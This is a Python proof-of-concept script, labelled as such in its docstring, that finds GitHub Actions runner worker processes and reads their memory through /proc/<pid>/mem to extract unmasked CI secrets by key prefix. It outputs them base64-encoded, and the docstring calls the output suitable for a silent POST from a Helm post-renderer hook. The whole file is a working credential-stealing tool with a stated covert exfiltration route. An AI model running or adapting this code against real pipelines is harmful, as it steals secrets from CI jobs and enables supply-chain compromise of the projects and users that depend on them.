#!/usr/bin/env python3
"""sudo /proc/<Runner.Worker>/{maps,mem} secret-context scanner (PoC).

Mechanism (source-verified against actions/runner@main):
  - Runner.Listener receives the job message and forwards JsonUtility.ToString(message)
    to the Runner.Worker child over an anonymous pipe (JobDispatcher.cs ~L497-504).
  - Worker deserializes it into AgentJobRequestMessage whose Variables dictionary
    holds every secret value for the whole job (Worker.cs L65-102, JobRunner.cs L36).
  - Worker.InitializeSecretMasker registers each secret (plus 11 encoded variants,
    HostContext.cs L103-113) in the SecretMasker, holding more plain copies.
All of that is UTF-16 .NET string material inside the worker process. Root
(passwordless sudo on GitHub-hosted runners) can read /proc/<pid>/mem.

Outputs a compact JSON of {key: value} for keys matching --key-prefix, base64'd,
suitable for a silent POST from a helm --post-renderer hook.
"""
import argparse
import base64
import json
import os
import re
import sys
import time

READ_CHUNK = 8 * 1024 * 1024
OVERLAP = 64 * 1024
MAX_REGION = 512 * 1024 * 1024

def candidate_pids(match="Runner.Worker|spawnclient|Runner.Listener"):
    pats = [m for m in match.split("|") if m]
    out = []
    for d in os.listdir("/proc"):
        if not d.isdigit():
            continue
        try:
            cmd = open(f"/proc/{d}/cmdline", "rb").read().replace(b"\x00", b" ").decode("utf-8", "replace")
        except OSError:
            continue
        if any(p in cmd for p in pats):
            out.append((int(d), cmd.strip()[:120]))
    return out

def readable_regions(pid):
    regions = []
    try:
        with open(f"/proc/{pid}/maps") as f:
            for line in f:
                parts = line.split()
                if len(parts) < 5:
                    continue
                if parts[1][0] != "r":
                    continue
                name = parts[5] if len(parts) >= 6 else ""
                if name in ("[vvar]", "[vsyscall]", "[vvar_vclock]"):
                    continue
                start_s, end_s = parts[0].split("-")
                start, end = int(start_s, 16), int(end_s, 16)
                if end - start > MAX_REGION:
                    end = start + MAX_REGION
                regions.append((start, end))
    except OSError:
        return []
    return regions

def windows(data, pattern, enc):
    """yield match offsets of pattern encoded in enc"""
    needle = pattern.encode(enc)
    i = data.find(needle)
    while i >= 0:
        yield i
        i = data.find(needle, i + 1)

def unescape(s):
    try:
        return json.loads('"' + s.replace('"', '\\"') + '"')
    except Exception:
        return s

def extract_from_utf16_window(text, key_re):
    found = {}
    # JSON shape inside the job message: "KEY":{"Value":"...","IsSecret":true}
    for m in re.finditer(r'"(' + key_re + r')"\s*:\s*\{\s*"Value"\s*:\s*"((?:[^"\\]|\\.)*)"', text):
        found.setdefault(m.group(1), unescape(m.group(2)))
    # fallback: bare "KEY":"value"
    for m in re.finditer(r'"(' + key_re + r')"\s*:\s*"((?:[^"\\]|\\.)*)"', text):
        found.setdefault(m.group(1), unescape(m.group(2)))
    return found

def scan_pid(pid, key_regex, timeout=60.0):
    # accept either a bare prefix alternation ("CHARTMUSEUM_|CI_") or a full regex
    key_re = key_regex if "A-Za-z0-9_" in key_regex else "(?:" + key_regex + ")[A-Za-z0-9_]*"
    prefilters = [p for p in key_regex.replace("(?:", "").rstrip(")").split("|") if p and not p.startswith("[")]
    hits = {}
    deadline = time.time() + timeout
    for start, end in readable_regions(pid):
        if time.time() > deadline:
            break
        pos = start
        while pos < end and time.time() < deadline:
            n = min(READ_CHUNK, end - pos)
            try:
                with open(f"/proc/{pid}/mem", "rb", buffering=0) as mem:
                    mem.seek(pos)
                    data = mem.read(n)
            except OSError:
                break
            if not data:
                break
            # UTF-16LE view (char stream) -> catch the JSON message string
            text = data.decode("utf-16-le", "ignore")
            if any(p in text for p in prefilters):
                for k, v in extract_from_utf16_window(text, key_re).items():
                    if v and v != "***" and k not in hits:
                        hits[k] = v
            # ASCII/UTF-8 view (wire copy)
            text8 = data.decode("utf-8", "ignore")
            if any(p in text8 for p in prefilters):
                for k, v in extract_from_utf16_window(text8, key_re).items():
                    if v and v != "***" and k not in hits:
                        hits[k] = v
            if n <= OVERLAP:
                break
            pos += n - OVERLAP
    return hits

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pid", type=int)
    ap.add_argument("--match", default="Runner.Worker|spawnclient|Runner.Listener")
    ap.add_argument("--key-prefix", default="CHARTMUSEUM_|CI_")
    ap.add_argument("--timeout", type=float, default=60.0)
    ap.add_argument("--debug", action="store_true")
    args = ap.parse_args()

    key_re = args.key_prefix
    pids = [(args.pid, "given")] if args.pid else candidate_pids(args.match)
    if not pids:
        print("no candidate pid", file=sys.stderr)
        return 0
    result = {}
    for pid, cmd in pids:
        try:
            hits = scan_pid(pid, key_re, args.timeout)
        except Exception as e:
            if args.debug:
                print(f"pid {pid} error {e}", file=sys.stderr)
            continue
        if hits:
            result[str(pid)] = hits
    blob = json.dumps(result, separators=(",", ":"))
    print(base64.b64encode(blob.encode()).decode())
    if args.debug:
        print(json.dumps(result, indent=1), file=sys.stderr)
    return 0

if __name__ == "__main__":
    sys.exit(main())
